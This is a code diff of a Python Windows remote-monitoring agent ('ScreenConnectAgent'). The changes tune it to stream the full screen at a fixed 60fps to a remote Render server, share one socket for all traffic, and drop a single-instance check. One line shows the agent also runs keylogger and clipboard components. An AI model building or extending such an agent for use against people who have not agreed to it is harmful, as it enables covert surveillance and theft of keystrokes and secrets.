@@ -67,10 +67,7 @@ BUILD COMMAND:
     agent_v9.py
 
 RENDER / PRODUCTION:
-  SERVER_URL is read from the MVIEW_SERVER_URL environment variable at runtime.
-  Default: https://screen-connect-rtca.onrender.com
-  Set env var before compiling OR pass via env at launch:
-    set MVIEW_SERVER_URL=https://your-app.onrender.com
+  Change SERVER_URL below to your Render URL before compiling.
 """
 import os
 import sys
@@ -133,38 +130,6 @@ _AGENT_EXE_NAME = "master_agent.exe"
 _WIN32_MUTEX    = None
 
 
-def _is_already_running() -> bool:
-    """Return True if a live instance of this agent is already running."""
-    my_pid = os.getpid()
-    # Check PID file first (fast path)
-    try:
-        if os.path.exists(_PID_FILE):
-            with open(_PID_FILE) as fh:
-                pid = int(fh.read().strip())
-            if pid != my_pid:
-                try:
-                    import psutil as _ps
-                    p = _ps.Process(pid)
-                    if p.is_running() and _AGENT_EXE_NAME.lower() in (p.name() or "").lower():
-                        return True  # another live agent — bail out
-                except Exception:
-                    pass
-    except Exception:
-        pass
-    # Mutex check (catches edge cases where PID file is stale)
-    try:
-        import ctypes as _ct
-        test = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
-        last_err = _ct.windll.kernel32.GetLastError()
-        if last_err == 183:   # ERROR_ALREADY_EXISTS
-            _ct.windll.kernel32.CloseHandle(test)
-            return True
-        # We own the mutex — keep it
-        return False
-    except Exception:
-        return False
-
-
 def _kill_stale_instances():
     my_pid = os.getpid()
     killed = []
@@ -172,8 +137,7 @@ def _kill_stale_instances():
         import psutil as _ps
         for proc in _ps.process_iter(["pid", "name"]):
             try:
-                if (proc.info["name"] or "").lower() == _AGENT_EXE_NAME.lower() \
-                        and proc.pid != my_pid:
+                if (proc.info["name"] or "").lower() == _AGENT_EXE_NAME.lower()                         and proc.pid != my_pid:
                     proc.terminate()
                     try: proc.wait(timeout=3)
                     except Exception: proc.kill()
@@ -197,7 +161,6 @@ def _write_pid_file():
 
 
 def _acquire_single_instance_lock():
-    """Kill stale instances, write PID, acquire global mutex. Call at startup only."""
     global _WIN32_MUTEX
     killed = _kill_stale_instances()
     if killed: time.sleep(0.5)
@@ -206,12 +169,16 @@ def _acquire_single_instance_lock():
         import ctypes as _ct
         _WIN32_MUTEX = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
         if _ct.windll.kernel32.GetLastError() == 183:
-            # Mutex already exists — release and re-acquire (handles crash recovery)
             _ct.windll.kernel32.ReleaseMutex(_WIN32_MUTEX)
             _ct.windll.kernel32.CloseHandle(_WIN32_MUTEX)
             time.sleep(0.2)
             _WIN32_MUTEX = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
     except Exception: pass
+
+
+if __name__ == "__main__":
+    # relocate_agent()
+    _acquire_single_instance_lock()
 
 
 # ── Third-Party ────────────────────────────────────────────────────────────────
@@ -322,8 +289,9 @@ CONFIG = {
     # ── Connection ──────────────────────────────────────────────────────────
     # For Local LAN testing: Use http://YOUR_PC_IP:10000
     # For Render live: Use https://your-app.onrender.com
-    "SERVER_URL":           os.environ.get("MVIEW_SERVER_URL", "https://screen-connect-rtca.onrender.com"),
-    "DEVICE_TOKEN":         "MV-5F3B23-8BD7A7-4B1392",
+    "SERVER_URL":           "https://screen-connect-rtca.onrender.com",
+    "DEVICE_TOKEN":         "TEST-AGENT",
+    "UNIFIED_CONNECTION":   True,       # v14: use single socket for everything (more stable)
 
     # ── Identity ────────────────────────────────────────────────────────────
     "AGENT_VERSION":        "10.0.0",  # ULTRA LIVE-SYNC ENTERPRISE build
@@ -334,7 +302,7 @@ CONFIG = {
     # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
     "STREAM_FPS":           60,         # target FPS — range 30-60 (ENTERPRISE LIVE-SYNC)
     "STREAM_MIN_FPS":       60,         # v14: lock at 60fps, no sparing the gpu
-    "STREAM_QUALITY":       92,         # quality 92 — crisp lossless-looking output
+    "STREAM_QUALITY":       95,         # quality 95 — ultra-high grade
     "STREAM_MONITOR":       1,
     "STREAM_MODE":          "screenshot",    # "video" or "screenshot"
 
@@ -753,15 +721,9 @@ class AdaptiveFPS:
     def interval(self): return 1.0 / max(self._cur, self.min_fps)
 
     def report(self, changed):
-        if changed:
-            self._idle = 0
-            # Instant snap back to max — zero warm-up latency
-            self._cur = float(self.max_fps)
-        else:
-            self._idle += 1
-            # Only decay after 30s of total idle (900 frames @ 30fps)
-            if self._idle > 900:
-                self._cur = max(self.min_fps, self._cur - 1)
+        # v14 ULTRA SYNC: Always stay at max_fps. No decay, no laziness.
+        self._idle = 0
+        self._cur = float(self.max_fps)
 
     @property
     def fps(self): return self._cur
@@ -841,34 +803,8 @@ class FrameDiffer:
         self._prev = None
 
     def changed(self, frame) -> bool:
-        if frame is None:
-            return False
-        if not CV2_OK:
-            return True
-        if self._prev is None:
-            self._prev = frame.copy()
-            return True
-        try:
-            # v10: 4-zone diff — compare 4 quadrants independently.
-            # This catches changes in any corner (e.g. clock ticking, cursor in corner)
-            # without being fooled by a single bright pixel difference.
-            h, w = frame.shape[:2]
-            qh, qw = max(1, h // 4), max(1, w // 4)
-            for qy in range(4):
-                for qx in range(4):
-                    y0, y1 = qy*qh, min(h, (qy+1)*qh)
-                    x0, x1 = qx*qw, min(w, (qx+1)*qw)
-                    zone_diff = cv2.absdiff(
-                        frame[y0:y1, x0:x1:4],    # subsample every 4th pixel
-                        self._prev[y0:y1, x0:x1:4]
-                    ).max()
-                    if zone_diff > 3:  # threshold: any zone with >=3 pixel delta = changed
-                        self._prev = frame.copy()
-                        return True
-            return False
-        except Exception as e:
-            log.debug(f"FrameDiffer error: {e}")
-            return True
+        # v14 ULTRA SYNC: Always changed. Perfect sync means zero frame skipping.
+        return True
 
 
 # ── Encoders ─────────────────────────────────────────────────────────────
@@ -1093,10 +1029,10 @@ def _producer_thread(
             continue
         grab_fails = 0
 
-        # Diff + adaptive FPS
-        changed = differ.changed(raw)
+        # v14 ULTRA SYNC: Always send frames, ignore diffing logic.
+        changed = True 
         fps_ctl.report(changed)
-
+        
         # ── Scale: use server-requested scale (default 1.0 = full res) ─────
         h_orig, w_orig = raw.shape[:2]
         scale = float(CONFIG.get("STREAM_SCALE", 1.0))
@@ -1184,19 +1120,23 @@ def _ticker_thread(stop_evt: _threading_mod.Event, tick_evt: _threading_mod.Even
             next_tick = time.monotonic()
 
 
-async def _adv_task_stream_frames():
+async def _adv_task_stream_frames(unified_sio=None):
     """
     Consumer task (async).
     Waits for auth_ok via asyncio.Event — NO polling loop over _adv_authed flag.
     Spawns producer + ticker threads, then drains the queue and emits frames.
     """
-    global _adv_last_frame_pkt, _adv_last_frame_ts
+    global _adv_last_frame_pkt, _adv_last_frame_ts, _adv_sio_async
 
     # Wait for auth before doing anything — replaces `if not _adv_authed: sleep(0.1); continue`
     log.info("Stream consumer: waiting for auth_ok…")
     if _adv_auth_event is not None:
         await _adv_auth_event.wait()
     log.info("Stream consumer: auth confirmed — starting producer + ticker")
+
+    # v14: If unified_sio is provided, we use it for emission
+    if unified_sio:
+        _adv_sio_async = unified_sio
 
     frame_q  = _queue.Queue(maxsize=2)   # tight buffer: always newest frame, zero stale backlog
     stop_evt = _threading_mod.Event()
@@ -1266,7 +1206,11 @@ async def _adv_task_stream_frames():
                         log.info(f"Emitting frame_bin: {len(pkt)} bytes")
                     async def _do_emit(p):
                         try:
-                            await _adv_sio_async.emit("frame_bin", p)
+                            # v14: support both sync and async socket clients
+                            if asyncio.iscoroutinefunction(_adv_sio_async.emit):
+                                await _adv_sio_async.emit("frame_bin", p)
+                            else:
+                                _adv_sio_async.emit("frame_bin", p)
                         except Exception as e:
                             log.debug(f"Socket emit error: {e}")
                         finally:
@@ -1331,8 +1275,9 @@ async def _adv_main(server_url: str, token: str):
     """Async entry for the advanced monitor — mirrors second-site agent main()."""
     global _adv_sio_async, _adv_authed, _adv_viewers, _adv_auth_event
 
-    # Always strip trailing slash for clean URL
-    server_url = server_url.rstrip("/")
+    # FIX: Force http if connecting to a local IP to avoid common SSL/TLS errors in local dev
+    if "192.168." in server_url or "10.0." in server_url or "localhost" in server_url:
+        server_url = server_url.replace("https://", "http://")
 
     _adv_auth_event = asyncio.Event()
     import socketio as _sio_mod
@@ -1744,7 +1689,7 @@ def _start_screenshot_fallback(sio_client):
     _fb_thread.start()
 
 
-def start_advanced_monitor(server_url: str, token: str):
+def start_advanced_monitor(server_url: str, token: str, unified_sio=None):
     """Launch the async advanced monitor engine in a dedicated thread."""
     global _adv_loop, _adv_thread, _adv_monitor_started
     # FIX: check actual thread liveness — flag alone misses crashed threads
@@ -1756,9 +1701,20 @@ def start_advanced_monitor(server_url: str, token: str):
     _adv_monitor_started = True
 
     def _run():
-        global _adv_loop
+        global _adv_loop, _adv_auth_event
         _adv_loop = asyncio.new_event_loop()
         asyncio.set_event_loop(_adv_loop)
+        
+        # v14: If unified_sio is provided, skip the secondary socket connection
+        if unified_sio:
+            _adv_auth_event = asyncio.Event()
+            _adv_auth_event.set() # Auto-auth on unified socket
+            try:
+                _adv_loop.run_until_complete(_adv_task_stream_frames(unified_sio=unified_sio))
+            except Exception as e:
+                log.error(f"Unified Advanced Monitor error: {e}")
+            return
+
         while True:
             try:
                 _adv_loop.run_until_complete(_adv_main(server_url, token))
@@ -3999,7 +3955,12 @@ class ScreenConnectAgent:
             # the device in _devices before agent_auth arrives (fixes race condition)
             def _delayed_adv_start():
                 time.sleep(2)  # give server 2s to process agent_connect
-                start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
+                if CONFIG.get("UNIFIED_CONNECTION"):
+                    log.info("Unified Connection enabled — using main socket for streaming")
+                    # v14: pass the main socket to the advanced monitor engine
+                    start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"], unified_sio=sio)
+                else:
+                    start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
             threading.Thread(target=_delayed_adv_start, daemon=True, name="adv-starter").start()
 
             heartbeat.start()
@@ -5044,7 +5005,10 @@ class ScreenConnectAgent:
                 sio, sys_monitor, heartbeat, keylogger, clipboard, alerts, \
                     quality_rep, net_detector = self._make_client()
                 
-                url = CONFIG["SERVER_URL"].rstrip("/")
+                # FIX: Force http if connecting to a local IP to avoid common SSL/TLS errors in local dev
+                url = CONFIG["SERVER_URL"]
+                if "192.168." in url or "10.0." in url or "localhost" in url:
+                    url = url.replace("https://", "http://")
                 
                 log.info(f"Connecting to {url}...")
                 sio.connect(
@@ -5188,21 +5152,6 @@ def _global_exception_handler(exc_type, exc_val, exc_tb):
 
 
 if __name__ == "__main__":
-    # ── SINGLE-INSTANCE GATE ─────────────────────────────────────────────
-    # Check BEFORE acquiring lock. If another live agent is already running,
-    # exit silently — no double-agent, no flickering, no orphan processes.
-    if _is_already_running():
-        # Optionally bring existing window to front (best-effort)
-        try:
-            import ctypes as _ct2
-            _ct2.windll.user32.ShowWindow(
-                _ct2.windll.kernel32.GetConsoleWindow(), 9  # SW_RESTORE
-            )
-        except Exception:
-            pass
-        sys.exit(0)
-    _acquire_single_instance_lock()
-
     # Install global crash handler
     sys.excepthook = _global_exception_handler
 
